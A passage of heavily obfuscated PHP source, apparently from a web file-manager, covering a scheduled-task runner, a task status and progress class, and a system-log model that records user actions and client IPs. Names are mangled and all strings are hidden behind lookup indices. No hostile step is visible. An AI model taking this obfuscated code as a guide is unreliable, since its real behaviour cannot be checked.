self::valueGet($›Ö¢ƒ£¥[852]) == $›Ö¢ƒ£¥[101] ? $›Ö¢ƒ£¥[238] : $›Ö¢ƒ£¥[101]; self::valueSet($›Ö¢ƒ£¥[852], $úıêˆ™¨); } public static function shutdownEvent() { $ŠœêŒèº =& $_SERVER[øşô´çË]; self::valueSet($ŠœêŒèº[941], $ŠœêŒèº[238]); self::log($ŠœêŒèº[1941]); } public static function config($ùñÇûÖé, $Î½Ï«’–) { self::valueSet($_SERVER[øşô´çË][852], $ùñÇûÖé); } private static function taskRunAll() { $ĞÔÙÊ› =& $_SERVER[øşô´çË]; $í‰³” = timeFloat(); $‡„¹±Ó = Model($ĞÔÙÊ›[1942])->listData(); $İ…’Öç = count($‡„¹±Ó); for ($Æ§ãİ€Ï = 0; $Æ§ãİ€Ï < $İ…’Öç; $Æ§ãİ€Ï++) { $²ÉöÒÏŒ = $‡„¹±Ó[$Æ§ãİ€Ï]; if (!$²ÉöÒÏŒ[$ĞÔÙÊ›[496]] || $²ÉöÒÏŒ[$ĞÔÙÊ›[1943]] != $ĞÔÙÊ›[101]) { continue; } if (!self::taskTimeCheck($²ÉöÒÏŒ)) { continue; } self::taskRun($²ÉöÒÏŒ); } Hook::trigger($ĞÔÙÊ›[1944]); self::taskQueueRun($í‰³”); } private static function taskQueueRun($¾ëÏÂ÷) { $ƒÁ°ò÷µ = 10; while (!0) { $Ø²Çşœ– = TaskQueue::run(); if ($Ø²Çşœ– === !1) { break; } if (timeFloat() - $¾ëÏÂ÷ >= $ƒÁ°ò÷µ) { break; } } } private static function taskTimeCheck($ß§òŒâ¹) { $ñ•¡êëé =& $_SERVER[øşô´çË]; $Äõ¦Òï… = json_decode($ß§òŒâ¹[$ñ•¡êëé[214]], !0); $€ß™ôŠ¦ = intval($ß§òŒâ¹[$ñ•¡êëé[1924]]); $õˆÅ²­ = strtotime($ñ•¡êëé[1945] . $Äõ¦Òï…[$ñ•¡êëé[1946]] . $ñ•¡êëé[1947]) - strtotime($ñ•¡êëé[1948]); $Ì·‹™îé = time() - strtotime(date($ñ•¡êëé[1949]) . $ñ•¡êëé[1950]); $ÖÄé‰’‰ = $Ì·‹™îé >= $õˆÅ²­ && $Ì·‹™îé <= $õˆÅ²­ + 3600; switch ($Äõ¦Òï…[$ñ•¡êëé[43]]) { case $ñ•¡êëé[1951]: if (time() - $€ß™ôŠ¦ < 3600 * 24 * 30) { return !1; } if ($Äõ¦Òï…[$ñ•¡êëé[1951]] == date($ñ•¡êëé[1952]) && $ÖÄé‰’‰) { return !0; } break; case $ñ•¡êëé[1953]: if (time() - $€ß™ôŠ¦ < 3600 * 24 * 7) { return !1; } $ï÷ã“åŒ = date($ñ•¡êëé[1954]) == 0 ? 7 : date($ñ•¡êëé[1954]); if ($Äõ¦Òï…[$ñ•¡êëé[1953]] == $ï÷ã“åŒ && $ÖÄé‰’‰) { return !0; } break; case $ñ•¡êëé[1946]: if (time() - $€ß™ôŠ¦ < 3600 * 24) { return !1; } if ($ÖÄé‰’‰) { return !0; } break; case $ñ•¡êëé[1955]: if (time() - $€ß™ôŠ¦ >= floatval($Äõ¦Òï…[$ñ•¡êëé[1955]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $ğÖâ‡­ş =& $_SERVER[øşô´çË]; static $©ëÕôÛ§ = 0; $áœ†¬÷È = 300; if (!$©ëÕôÛ§) { $©ëÕôÛ§ = time(); } if (time() - $©ëÕôÛ§ < $áœ†¬÷È) { return; } $©ëÕôÛ§ = time(); $·úö² = Model($ğÖâ‡­ş[606])->db($ğÖâ‡­ş[12]); if ($·úö²) { $·úö²->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($ğÖâ‡­ş[1956], $ğÖâ‡­ş[1957]); die; } } public static function taskRun($¦Ä§£Î) { $ùÊ­‡Á½ =& $_SERVER[øşô´çË]; self::log($ùÊ­‡Á½[1958] . $¦Ä§£Î[$ùÊ­‡Á½[496]] . $ùÊ­‡Á½[1959] . $¦Ä§£Î[$ùÊ­‡Á½[42]] . $ùÊ­‡Á½[1960] . $¦Ä§£Î[$ùÊ­‡Á½[1559]]); Model($ùÊ­‡Á½[1942])->run($¦Ä§£Î[$ùÊ­‡Á½[496]]); $ĞåÒ“•¶ = timeFloat(); $ œ—§îø = $ùÊ­‡Á½[12]; switch ($¦Ä§£Î[$ùÊ­‡Á½[43]]) { case $ùÊ­‡Á½[391]: $ÂŠ›À½· = url_request($¦Ä§£Î[$ùÊ­‡Á½[1559]], $ùÊ­‡Á½[1601], !1, !1, !1, !1, 10); if ($ÂŠ›À½·[$ùÊ­‡Á½[852]]) { $ œ—§îø = strlen($ÂŠ›À½·[$ùÊ­‡Á½[1388]]); } break; case $ùÊ­‡Á½[1961]: $ œ—§îø = Hook::apply($¦Ä§£Î[$ùÊ­‡Á½[1559]]); default: break; } Model($ùÊ­‡Á½[1962])->add(array($ùÊ­‡Á½[1963] => $ùÊ­‡Á½[12], $ùÊ­‡Á½[1964] => $ùÊ­‡Á½[238], $ùÊ­‡Á½[43] => $ùÊ­‡Á½[1965] . $¦Ä§£Î[$ùÊ­‡Á½[496]], $ùÊ­‡Á½[1966] => json_encode(array($ùÊ­‡Á½[42] => $¦Ä§£Î[$ùÊ­‡Á½[42]], $ùÊ­‡Á½[1967] => timeFloat() - $ĞåÒ“•¶, $ùÊ­‡Á½[858] => $ œ—§îø)))); $ùÁÒÙú = $ œ—§îø ? $ùÊ­‡Á½[1968] . $ œ—§îø : $ùÊ­‡Á½[12]; self::log($ùÊ­‡Á½[1969] . $¦Ä§£Î[$ùÊ­‡Á½[496]] . $ùÊ­‡Á½[185] . $ùÁÒÙú); return !0; } public static function valueGet($„Åşù¹Ğ) { $¨¿» =& $_SERVER[øşô´çË]; $®ªµ¡Ù = $¨¿»[1970]; $ş†…Øîë = Model($¨¿»[531])->get($„Åşù¹Ğ, $®ªµ¡Ù); if (is_null($ş†…Øîë)) { Model($¨¿»[531])->set($¨¿»[852], $¨¿»[101], $®ªµ¡Ù); Model($¨¿»[531])->set($¨¿»[941], $¨¿»[238], $®ªµ¡Ù); $ş†…Øîë = Model($¨¿»[531])->get($„Åşù¹Ğ, $®ªµ¡Ù); } return $ş†…Øîë; } private static function valueSet($äÂé•Ÿ¾, $øƒÔÀè = false) { $Íá±µ£š =& $_SERVER[øşô´çË]; $¯îÏˆ”‹ = $Íá±µ£š[1971]; CacheLock::lock($¯îÏˆ”‹); $‡¾–“ÈÚ = Model($Íá±µ£š[531])->set($äÂé•Ÿ¾, $øƒÔÀè, $Íá±µ£š[1970]); CacheLock::unlock($¯îÏˆ”‹); return $‡¾–“ÈÚ; } protected static function log($Ê†ûáº–) { write_log($Ê†ûáº–, $_SERVER[øşô´çË][1957]); } private static function cacheClear() { $€µ³–µ =& $_SERVER[øşô´çË]; Cache::clearMemory(Model($€µ³–µ[531])->cacheKey($€µ³–µ[1970])); Cache::clearMemory(Model($€µ³–µ[531])->cacheKey($€µ³–µ[1972])); Model($€µ³–µ[1942])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\163\164\157\160"; const STATYS_RUNNING = "\x72\x75\156\156\x69\156\147"; const STATYS_KILL = "\x6b\151\x6c\x6c"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($¿¯è·Ç, $ÊÕû•ÁÁ = '', $Ïû°ËÀä = 0, $š¼ãôŞˆ = '') { $«ş†¦õİ =& $_SERVER[øşô´çË]; if (self::get($¿¯è·Ç)) { return; } $this->task = array($«ş†¦õİ[496] => $¿¯è·Ç, $«ş†¦õİ[1588] => USER_ID, $«ş†¦õİ[1862] => $š¼ãôŞˆ, $«ş†¦õİ[549] => $«ş†¦õİ[12], $«ş†¦õİ[43] => $ÊÕû•ÁÁ, $«ş†¦õİ[1230] => $«ş†¦õİ[12], $«ş†¦õİ[1228] => $Ïû°ËÀä, $«ş†¦õİ[1973] => 0, $«ş†¦õİ[1974] => 0, $«ş†¦õİ[1975] => 0, $«ş†¦õİ[1976] => timeFloat(), $«ş†¦õİ[1977] => 0, $«ş†¦õİ[1978] => 0, $«ş†¦õİ[1979] => 0, $«ş†¦õİ[1980] => 0, $«ş†¦õİ[852] => $«ş†¦õİ[941]); $GLOBALS[$«ş†¦õİ[1981]] = 1; Hook::bind($«ş†¦õİ[1927], array($this, $«ş†¦õİ[1982])); Hook::bind($«ş†¦õİ[1983], array($this, $«ş†¦õİ[1984])); $this->startAfter(); Hook::trigger($«ş†¦õİ[1985], $this->task); $this->task[$«ş†¦õİ[1978]] = timeFloat(); } public function end($¿¯Šê¸³ = '') { $ÚÂ¹Àœ‘ =& $_SERVER[øşô´çË]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$ÚÂ¹Àœ‘[1978]]) { self::valueSet($this->task[$ÚÂ¹Àœ‘[496]], !1); } $this->isEnd = !0; if ($¿¯Šê¸³) { $this->task[$ÚÂ¹Àœ‘[549]] = $¿¯Šê¸³; } self::log($ÚÂ¹Àœ‘[1986] . $this->task[$ÚÂ¹Àœ‘[496]] . $ÚÂ¹Àœ‘[1987] . sprintf($ÚÂ¹Àœ‘[1010], timeFloat() - $this->task[$ÚÂ¹Àœ‘[1976]]) . $ÚÂ¹Àœ‘[1988]); Hook::unbind($ÚÂ¹Àœ‘[1927], array($this, $ÚÂ¹Àœ‘[1982])); Hook::unbind($ÚÂ¹Àœ‘[1983], array($this, $ÚÂ¹Àœ‘[1984])); $this->endAfter(); $åÅÑëÁ‚ = $this->task; $this->task = !1; Hook::trigger($ÚÂ¹Àœ‘[1989], $åÅÑëÁ‚); } public function update($ÚÛêß­’ = 0, $­ëçö ò = false) { $»¥óú =& $_SERVER[øşô´çË]; $©âé˜½Ñ =& $this->task; if (!$©âé˜½Ñ) { return; } $©âé˜½Ñ[$»¥óú[1973]] += $ÚÛêß­’; $©âé˜½Ñ[$»¥óú[1977]] = timeFloat(); if ($©âé˜½Ñ[$»¥óú[1228]]) { if ($©âé˜½Ñ[$»¥óú[1228]] < $©âé˜½Ñ[$»¥óú[1973]]) { $©âé˜½Ñ[$»¥óú[1228]] = $©âé˜½Ñ[$»¥óú[1973]]; } $Èöá˜Ë = timeFloat() - $©âé˜½Ñ[$»¥óú[1976]] - $©âé˜½Ñ[$»¥óú[1979]]; if ($Èöá˜Ë <= 0) { $Èöá˜Ë = 0.001; } $©âé˜½Ñ[$»¥óú[1974]] = $©âé˜½Ñ[$»¥óú[1973]] / $©âé˜½Ñ[$»¥óú[1228]]; $©âé˜½Ñ[$»¥óú[1975]] = $©âé˜½Ñ[$»¥óú[1973]] / $Èöá˜Ë; if ($©âé˜½Ñ[$»¥óú[1974]] > 0) { $©âé˜½Ñ[$»¥óú[1980]] = $Èöá˜Ë * (1 - $©âé˜½Ñ[$»¥óú[1974]]) / $©âé˜½Ñ[$»¥óú[1974]]; } $©âé˜½Ñ[$»¥óú[1980]] = $©âé˜½Ñ[$»¥óú[1980]] <= 0 ? 0 : $©âé˜½Ñ[$»¥óú[1980]]; } $this->updateAfter(); $‚™ç™ü¤ = 0.2; if (timeFloat() - $©âé˜½Ñ[$»¥óú[1978]] < $‚™ç™ü¤ && !$­ëçö ò) { return; } $§Òº‹ó¾ = self::get($©âé˜½Ñ[$»¥óú[496]]); $°³Ÿ†õñ = $§Òº‹ó¾[$»¥óú[852]]; if ($°³Ÿ†õñ == self::STATYS_KILL) { $¦‘ì ° = array($»¥óú[1990] => LNG($»¥óú[1991]), $»¥óú[1398] => !1); Cache::set($»¥óú[1992] . $this->task[$»¥óú[496]], $¦‘ì °, 30); $this->onKill(); $this->end(); die; } else { if ($°³Ÿ†õñ == self::STATYS_STOP) { $¨¯­øñ = 2; $§Òº‹ó¾[$»¥óú[1979]] += $¨¯­øñ; self::valueSet($©âé˜½Ñ[$»¥óú[496]], $§Òº‹ó¾); sleep($¨¯­øñ); $this->update(); return; } } $©âé˜½Ñ[$»¥óú[852]] = $°³Ÿ†õñ ? $°³Ÿ†õñ : $©âé˜½Ñ[$»¥óú[852]]; $©âé˜½Ñ[$»¥óú[1979]] = $§Òº‹ó¾[$»¥óú[1979]] ? $§Òº‹ó¾[$»¥óú[1979]] : 0; $©âé˜½Ñ[$»¥óú[1978]] = timeFloat(); Hook::trigger($»¥óú[1993], $©âé˜½Ñ); self::valueSet($©âé˜½Ñ[$»¥óú[496]], $©âé˜½Ñ); } public function onKillSet($Ë‚ˆ²£‰, $¸•ì’ĞÊ = array()) { $this->onKillCall = array($Ë‚ˆ²£‰, $¸•ì’ĞÊ); } public function onKill() { $´¼¨¨å× =& $_SERVER[øşô´çË]; self::log($´¼¨¨å×[1986] . $this->task[$´¼¨¨å×[496]] . $´¼¨¨å×[1994]); Hook::trigger($´¼¨¨å×[1995], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($ËŸÍ•ó) { $£÷ü¨úğ =& $_SERVER[øşô´çË]; Cache::set($£÷ü¨úğ[1992] . $this->task[$£÷ü¨úğ[496]], $ËŸÍ•ó, 60); if (!is_array($ËŸÍ•ó) || !$ËŸÍ•ó[$£÷ü¨úğ[1398]]) { self::log($£÷ü¨úğ[1996] . json_encode($ËŸÍ•ó)); } return $ËŸÍ•ó; } public static function get($¶ÓÚóî£) { $Ïúô£„Ğ =& $_SERVER[øşô´çË]; $ÕÅ¡´Ñ = self::valueGet($¶ÓÚóî£); if (is_array($ÕÅ¡´Ñ) && $ÕÅ¡´Ñ[$Ïúô£„Ğ[1997]]) { $ŸÂ³¼Çœ = ActionApply($ÕÅ¡´Ñ[$Ïúô£„Ğ[1997]], array($ÕÅ¡´Ñ)); $ÕÅ¡´Ñ = is_array($ŸÂ³¼Çœ) ? $ŸÂ³¼Çœ : $ÕÅ¡´Ñ; } return $ÕÅ¡´Ñ; } public static function listData() { $­êÎòßÒ = self::valueGet(); return array_sort_by($­êÎòßÒ, $_SERVER[øşô´çË][1976], !0); } public static function kill($×ûÓ³·õ) { return self::changeStatus($×ûÓ³·õ, self::STATYS_KILL); } public static function stop($Ñ‚˜“·) { return self::changeStatus($Ñ‚˜“·, self::STATYS_STOP); } public static function restart($€ãë¢’Á) { return self::changeStatus($€ãë¢’Á, self::STATYS_RUNNING); } public static function killAll() { $Œ®ªòÎ÷ =& $_SERVER[øşô´çË]; $«øÙ§®‹ = self::listData(); foreach ($«øÙ§®‹ as $Ìá­ ) { self::kill($Ìá­ [$Œ®ªòÎ÷[496]]); } sleep(2); foreach ($«øÙ§®‹ as $Ìá­ ) { self::valueSet($Ìá­ [$Œ®ªòÎ÷[496]], !1); } } private static function changeStatus($Ñ¼¨²µ¬, $¡ÙêÌ˜ ) { $ñƒÔ¥íœ =& $_SERVER[øşô´çË]; $‡ÚøÊ‹Î = self::valueGet($Ñ¼¨²µ¬); if (!$‡ÚøÊ‹Î) { return !1; } $‡ÚøÊ‹Î[$ñƒÔ¥íœ[852]] = $¡ÙêÌ˜ ; self::valueSet($Ñ¼¨²µ¬, $‡ÚøÊ‹Î); self::log($ñƒÔ¥íœ[1998] . $‡ÚøÊ‹Î[$ñƒÔ¥íœ[496]] . $ñƒÔ¥íœ[1999] . $¡ÙêÌ˜ ); return !0; } public static function valueGet($ô¸÷İŸü = false) { $´–ü¨åş =& $_SERVER[øşô´çË]; if ($ô¸÷İŸü) { $Ì«­‘Õ = Model($´–ü¨åş[543])->where(array($´–ü¨åş[105] => $ô¸÷İŸü, $´–ü¨åş[43] => $´–ü¨åş[1237]))->find(); return $Ì«­‘Õ ? json_decode($Ì«­‘Õ[$´–ü¨åş[460]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($™âëÂß™ = false) { $Ÿ–é¶ŠÜ =& $_SERVER[øşô´çË]; $èœıÊ›œ = array($Ÿ–é¶ŠÜ[43] => $Ÿ–é¶ŠÜ[1237]); if ($™âëÂß™) { $èœıÊ›œ[$Ÿ–é¶ŠÜ[1588]] = $™âëÂß™; } $Æù°Ó÷Ã = Model($Ÿ–é¶ŠÜ[543])->where($èœıÊ›œ)->select(); $Æù°Ó÷Ã = $Æù°Ó÷Ã ? $Æù°Ó÷Ã : array(); foreach ($Æù°Ó÷Ã as $ÎÕ“‚‹Ï => $ÉˆÉñ‰Û) { $Æù°Ó÷Ã[$ÎÕ“‚‹Ï] = json_decode($ÉˆÉñ‰Û[$Ÿ–é¶ŠÜ[460]], !0); } return $Æù°Ó÷Ã; } public static function valueSet($ı§ù‹„È, $ÇÆËĞæÍ) { $¡Ì…½Ğñ =& $_SERVER[øşô´çË]; if (!$ÇÆËĞæÍ) { return Model($¡Ì…½Ğñ[543])->where(array($¡Ì…½Ğñ[105] => $ı§ù‹„È, $¡Ì…½Ğñ[43] => $¡Ì…½Ğñ[1237]))->delete(); } $ä°Şİ¹‚ = json_encode($ÇÆËĞæÍ); if (!$ä°Şİ¹‚) { ob_start(); var_dump($ÇÆËĞæÍ); $÷ñƒİä = ob_get_clean(); self::log($¡Ì…½Ğñ[2000] . json_encode_force($÷ñƒİä)); } if (!$ı§ù‹„È || !$ÇÆËĞæÍ[$¡Ì…½Ğñ[496]]) { return !1; } $ë²€÷•Ä = array($¡Ì…½Ğñ[43] => $¡Ì…½Ğñ[1237], $¡Ì…½Ğñ[1588] => USER_ID, $¡Ì…½Ğñ[105] => $ı§ù‹„È, $¡Ì…½Ğñ[460] => $ä°Şİ¹‚); $ÔÚÔÜ¡· = $¡Ì…½Ğñ[2001]; CacheLock::lock($ÔÚÔÜ¡·); Model($¡Ì…½Ğñ[543])->add($ë²€÷•Ä, array(), !0); CacheLock::unlock($ÔÚÔÜ¡·); } public static function log($í¬Ää») { if (!GLOBAL_DEBUG) { return; } write_log($í¬Ää», $_SERVER[øşô´çË][2002]); } } goto Bø¨°÷Ñµ; Cµé¨§‚®: class SystemLogModel extends ModelBase { protected $tableName = "\163\x79\163\x74\x65\155\137\x6c\157\147"; protected $dataAuto = array(array("\x63\x72\x65\141\x74\x65\124\x69\155\x65", "\x74\151\x6d\x65", "\151\x6e\163\x65\x72\x74", "\x66\165\156\143\164\151\157\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $±š÷†úº =& $_SERVER[øşô´çË]; return array($±š÷†úº[2545] => LNG($±š÷†úº[2546]), $±š÷†úº[2547] => LNG($±š÷†úº[2548]), $±š÷†úº[2124] => LNG($±š÷†úº[2549]), $±š÷†úº[2550] => LNG($±š÷†úº[2551]), $±š÷†úº[2552] => LNG($±š÷†úº[2553]), $±š÷†úº[2554] => LNG($±š÷†úº[2555]), $±š÷†úº[2556] => LNG($±š÷†úº[2557]), $±š÷†úº[2151] => LNG($±š÷†úº[2557]), $±š÷†úº[2152] => LNG($±š÷†úº[2558]), $±š÷†úº[2559] => LNG($±š÷†úº[2560]), $±š÷†úº[2561] => LNG($±š÷†úº[2562]), $±š÷†úº[2563] => LNG($±š÷†úº[2564]), $±š÷†úº[2565] => LNG($±š÷†úº[2566]), $±š÷†úº[2149] => LNG($±š÷†úº[2567]), $±š÷†úº[2568] => LNG($±š÷†úº[2569]), $±š÷†úº[2156] => LNG($±š÷†úº[2570]), $±š÷†úº[2571] => LNG($±š÷†úº[2572]), $±š÷†úº[2573] => LNG($±š÷†úº[2574]), $±š÷†úº[2575] => LNG($±š÷†úº[2576]), $±š÷†úº[2577] => LNG($±š÷†úº[2578]), $±š÷†úº[2158] => LNG($±š÷†úº[2579]), $±š÷†úº[2159] => LNG($±š÷†úº[2580]), $±š÷†úº[2581] => LNG($±š÷†úº[2582]), $±š÷†úº[2583] => LNG($±š÷†úº[2584]), $±š÷†úº[2585] => LNG($±š÷†úº[2586]), $±š÷†úº[2154] => LNG($±š÷†úº[2587]), $±š÷†úº[2588] => LNG($±š÷†úº[2589]), $±š÷†úº[2153] => LNG($±š÷†úº[2590]), $±š÷†úº[2591] => LNG($±š÷†úº[2591]), $±š÷†úº[2592] => LNG($±š÷†úº[2593]), $±š÷†úº[2594] => LNG($±š÷†úº[2591]), $±š÷†úº[2595] => LNG($±š÷†úº[2596]), $±š÷†úº[2597] => LNG($±š÷†úº[2598]), $±š÷†úº[2599] => LNG($±š÷†úº[2598]), $±š÷†úº[2600] => LNG($±š÷†úº[2601]), $±š÷†úº[2602] => LNG($±š÷†úº[2602]), $±š÷†úº[2603] => LNG($±š÷†úº[2128]), $±š÷†úº[2604] => LNG($±š÷†úº[2605]), $±š÷†úº[2606] => LNG($±š÷†úº[2607]), $±š÷†úº[2608] => LNG($±š÷†úº[2609]), $±š÷†úº[2610] => LNG($±š÷†úº[2611]), $±š÷†úº[2612] => LNG($±š÷†úº[2613]), $±š÷†úº[2614] => LNG($±š÷†úº[2614]), $±š÷†úº[2615] => LNG($±š÷†úº[2616]), $±š÷†úº[2617] => LNG($±š÷†úº[2618]), $±š÷†úº[2619] => LNG($±š÷†úº[2620]), $±š÷†úº[2621] => LNG($±š÷†úº[2622]), $±š÷†úº[2623] => LNG($±š÷†úº[2624]), $±š÷†úº[2625] => LNG($±š÷†úº[2626]), $±š÷†úº[220] => LNG($±š÷†úº[220]), $±š÷†úº[221] => LNG($±š÷†úº[2627]), $±š÷†úº[2628] => LNG($±š÷†úº[2628])); } private function typeFile() { $ïöî† =& $_SERVER[øşô´çË]; $Î®÷È  = array($ïöî†[2156] => array($ïöî†[2157]), $ïöî†[2563] => array($ïöî†[2629]), $ïöî†[2565] => array($ïöî†[2630]), $ïöî†[2149] => array($ïöî†[2150], $ïöî†[2631]), $ïöî†[2573] => array(), $ïöî†[2575] => array(), $ïöî†[2577] => array(), $ïöî†[2158] => array($ïöî†[2160]), $ïöî†[2159] => array($ïöî†[2160]), $ïöî†[2581] => array($ïöî†[2632]), $ïöî†[2583] => array($ïöî†[2632]), $ïöî†[2585] => array($ïöî†[2633]), $ïöî†[2571] => array($ïöî†[2634]), $ïöî†[2154] => array($ïöî†[2635]), $ïöî†[2588] => array($ïöî†[2636]), $ïöî†[2153] => array($ïöî†[2155])); return $Î®÷È ; } private function typeAll() { $òÒÄ¥…… =& $_SERVER[øşô´çË]; $»èÃÆÃ¨ = $this->typeList; $¾ÈÁöùÈ = array_filter($this->typeFile()); foreach ($¾ÈÁöùÈ as $Û—¦¤ä¼ => $Ç•³¤Ï) { $»èÃÆÃ¨[$Ç•³¤Ï[0]] = $»èÃÆÃ¨[$Û—¦¤ä¼]; } $»èÃÆÃ¨[$òÒÄ¥……[2160]] = LNG($òÒÄ¥……[2637]); $»èÃÆÃ¨[$òÒÄ¥……[2632]] = LNG($òÒÄ¥……[2638]); return $»èÃÆÃ¨; } public function addLog($èè©£, $Ÿ£§“ö¥ = array()) { $íäú¯ËÙ =& $_SERVER[øşô´çË]; if (!isset($this->typeList[$èè©£])) { return; } $œú–½² = Session::get($íäú¯ËÙ[2317]); if (!$œú–½²) { $œú–½² = _get($Ÿ£§“ö¥, $íäú¯ËÙ[1588], 0); } if ($èè©£ == $íäú¯ËÙ[2604] && is_array($Ÿ£§“ö¥[$íäú¯ËÙ[2639]]) && !$Ÿ£§“ö¥[$íäú¯ËÙ[2639]]) { return; } $¹½ÄÆ€Å = get_client_ip(); if (!$Ÿ£§“ö¥ || strlen(json_encode($Ÿ£§“ö¥)) >= 1024 * 64) { if ($Ÿ£§“ö¥ && is_array($Ÿ£§“ö¥)) { $Ÿ£§“ö¥ = array_intersect_key($Ÿ£§“ö¥, array_flip($íäú¯ËÙ[496], $íäú¯ËÙ[42])); $Ÿ£§“ö¥[$íäú¯ËÙ[1604]] = $¹½ÄÆ€Å; } else { $Ÿ£§“ö¥ = array($íäú¯ËÙ[1604] => $¹½ÄÆ€Å); } } else { if (is_array($Ÿ£§“ö¥)) { $Ÿ£§“ö¥[$íäú¯ËÙ[1604]] = $¹½ÄÆ€Å; } else { $Ÿ£§“ö¥ = array($íäú¯ËÙ[1388] => $Ÿ£§“ö¥, $íäú¯ËÙ[1604] => $¹½ÄÆ€Å); } } $Ÿ£§“ö¥[$íäú¯ËÙ[2640]] = ACTION; $Ÿ£§“ö¥ = array($íäú¯ËÙ[1963] => Session::sign(), $íäú¯ËÙ[1964] => intval($œú–½²), $íäú¯ËÙ[43] => $èè©£, $íäú¯ËÙ[1966] => json_encode($Ÿ£§“ö¥)); Hook::trigger($íäú¯ËÙ[2641], $Ÿ£§“ö¥); return parent::add($Ÿ£§“ö¥); } public function remove($¹˜™àÆÙ) { $this->where(array($_SERVER[øşô´çË][517] => $¹˜™àÆÙ))->delete(); } private function _makeOrder($«‘¢Ä­ = '') { $¢¸™Ø­Ë =& $_SERVER[øşô´çË]; $å´Ê÷Èí = $¢¸™Ø­Ë[241]; $¨÷çŠ§ = array($¢¸™Ø­Ë[546] => $¢¸™Ø­Ë[547], $¢¸™Ø­Ë[548] => $¢¸™Ø­Ë[549]); $ÀŠ«Š = Input::get($¢¸™Ø­Ë[554], $¢¸™Ø­Ë[7], $¢¸™Ø­Ë[2354], array($¢¸™Ø­Ë[2273], $¢¸™Ø­Ë[548])); $ÀŠ«Š = $¨÷çŠ§[$ÀŠ«Š]; $«‘¢Ä­ = $«‘¢Ä­ . "{$å´Ê÷Èí}\x20{$ÀŠ«Š}"; return $this->order($«‘¢Ä­); } public function get($Ê³Ë ÖÁ = '') { $Çòè”Ï =& $_SERVER[øşô´çË]; if (!$Ê³Ë ÖÁ) { show_json(array()); } $æƒâ¡é = array(); if ($Ê³Ë ÖÁ[$Çòè”Ï[1588]]) { $æƒâ¡é[$Çòè”Ï[1588]] = $Ê³Ë ÖÁ[$Çòè”Ï[1588]]; } if (isset($Ê³Ë ÖÁ[$Çòè”Ï[863]])) { $ÔàÅÓ‰ = $Ê³Ë ÖÁ[$Çòè”Ï[863]]; $ÔÔ†ïó = isset($Ê³Ë ÖÁ[$Çòè”Ï[864]]) ? $Ê³Ë ÖÁ[$Çòè”Ï[864]] : time(); $æƒâ¡é[$Çòè”Ï[241]] = array($Çòè”Ï[417], array($ÔàÅÓ‰, $ÔÔ†ïó)); } if ($Ê³Ë ÖÁ[$Çòè”Ï[43]]) { $œÑ¤¡Â‡ = explode($Çòè”Ï[60], $Ê³Ë ÖÁ[$Çòè”Ï[43]]); $ğî¬œ† = $this->typeFile(); $¤¾¨ª÷‰ = array(); foreach ($œÑ¤¡Â‡ as $úêˆß³î) { $¤¾¨ª÷‰[] = $úêˆß³î; if (isset($ğî¬œ†[$úêˆß³î])) { $¤¾¨ª÷‰ = array_merge($¤¾¨ª÷‰, $ğî¬œ†[$úêˆß³î]); } } $¤¾¨ª÷‰ = array_unique($¤¾¨ª÷‰); if ($¤¾¨ª÷‰) { $æƒâ¡é[$Çòè”Ï[43]] = array($Çòè”Ï[7], $¤¾¨ª÷‰); } } else { $æƒâ¡é[$Çòè”Ï[43]] = array($Çòè”Ï[2642], $Çòè”Ï[2643]); } if (!empty($Ê³Ë ÖÁ[$Çòè”Ï[1604]])) { $æƒâ¡é[$Çòè”Ï[549]] = array($Çòè”Ï[482], "\x25{$Ê³Ë ÖÁ[$Çòè”Ï[1604]]}\45"); } $èÕÌß» = $this->_makeOrder()->where($æƒâ¡é)->selectPage(); if (empty($èÕÌß»[$Çòè”Ï[455]])) { show_json(array(), !0, $èÕÌß»[$Çòè”Ï[452]]); } $èÕÌß»[$Çòè”Ï[455]] = $this->logList($èÕÌß»[$Çòè”Ï[455]]); return $èÕÌß»; } private function ipAddress(&$¨Ñ¾é€) { $î×æñŒÄ =& $_SERVER[øşô´çË]; if (!empty($¨Ñ¾é€[$î×æñŒÄ[1604]])) { $Ñ—¦¥ = IpLocation::get($¨Ñ¾é€[$î×æñŒÄ[1604]]); } else { $Ñ—¦¥ = LNG($î×æñŒÄ[2644]); } $¨Ñ¾é€[$î×æñŒÄ[2645]] = $Ñ—¦¥; } private function descZipDownload($ïïç¶ª“, &$şÉàÇ–Œ) { $ë ìŸ—¾ =& $_SERVER[øşô´çË]; if (!isset($ïïç¶ª“[$ë ìŸ—¾[1611]])) { return; } $Ëş“¨‘ó = json_decode($ïïç¶ª“[$ë ìŸ—¾[1611]], !0); foreach ($Ëş“¨‘ó as $şœÂìÃ“) { try { $Œä«üï‹ = IO::infoFullSimple($şœÂìÃ“[$ë ìŸ—¾[97]]); } catch (Exception $ÑëÂÖ¼ä) { continue; } $ïïç¶ª“[$ë ìŸ—¾[97]] = $şœÂìÃ“[$ë ìŸ—¾[97]]; $şÉàÇ–Œ[] = $ïïç¶ª“[$ë ìŸ—¾[201]] = $Œä«üï‹[$ë ìŸ—¾[201]]; $şÉàÇ–Œ[] = $ïïç¶ª“[$ë ìŸ—¾[2414]] = $Œä«üï‹[$ë ìŸ—¾[200]]; break; } return $ïïç¶ª“; } private function getSourceList(&$‘˜†œıŸ) { $ò‹Ôš–æ =& $_SERVER[øşô´çË]; $¢›¹¦ = array(); foreach ($‘˜†œıŸ as $úì´ ú => $¼Å‘Ã˜) { $Î¾Ç¥Ş€ = json_decode($¼Å‘Ã˜[$ò‹Ôš–æ[549]], !0); if ($¼Å‘Ã˜[$ò‹Ôš–æ[43]] == $ò‹Ôš–æ[2152]) { $Î¾Ç¥Ş€ = $this->descZipDownload($Î¾Ç¥Ş€, $¢›¹¦); $‘˜†œıŸ[$úì´ ú][$ò‹Ôš–æ[549]] = json_encode($Î¾Ç¥Ş€); continue; } if (strpos($¼Å‘Ã˜[$ò‹Ôš–æ[43]], $ò‹Ôš–æ[2416]) !== 0) { if (!isset($Î¾Ç¥Ş€[$ò‹Ôš–æ[97]]) || 